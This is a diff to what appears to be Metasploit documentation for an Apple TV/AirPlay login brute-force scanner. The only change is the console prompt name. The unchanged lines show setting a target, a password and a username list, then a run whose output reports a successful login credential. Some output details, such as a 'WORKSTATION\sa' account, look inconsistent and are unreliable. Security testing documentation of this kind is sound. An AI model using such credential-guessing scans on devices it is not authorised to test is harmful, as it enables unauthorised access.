@@ -65,13 +65,13 @@ HTTP server virtual host
 ## Scenarios
 ```
 msf > use auxiliary/scanner/http/appletv_login
-msf6 auxiliary(scanner/http/appletv_login) > set rhosts 127.0.0.1
+msf auxiliary(scanner/http/appletv_login) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf6 auxiliary(scanner/http/appletv_login) > set password N0tpassword!
+msf auxiliary(scanner/http/appletv_login) > set password N0tpassword!
 password => N0tpassword!
-msf6 auxiliary(scanner/http/appletv_login) > set userfile ./USERNAMES
+msf auxiliary(scanner/http/appletv_login) > set userfile ./USERNAMES
 userfile => ./USERNAMES
-msf6 auxiliary(scanner/http/appletv_login) > options
+msf auxiliary(scanner/http/appletv_login) > options
 
 Module options (auxiliary/scanner/http/appletv_login):
 
@@ -99,12 +99,12 @@ Module options (auxiliary/scanner/http/appletv_login):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(scanner/http/appletv_login) > run
+msf auxiliary(scanner/http/appletv_login) > run
 
 [*] Attempting to login to /stop using password list
 [!] 127.0.0.1:7000        - No active DB -- Credential data will not be saved!
 [-] 127.0.0.1:7000        - Failed: 'AirPlay:password'
 [+] 127.0.0.1:7000         - 127.0.0.1:7000 - Login Successful: WORKSTATION\sa:N0tpassword!
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/appletv_login) >
+msf auxiliary(scanner/http/appletv_login) >
 ```
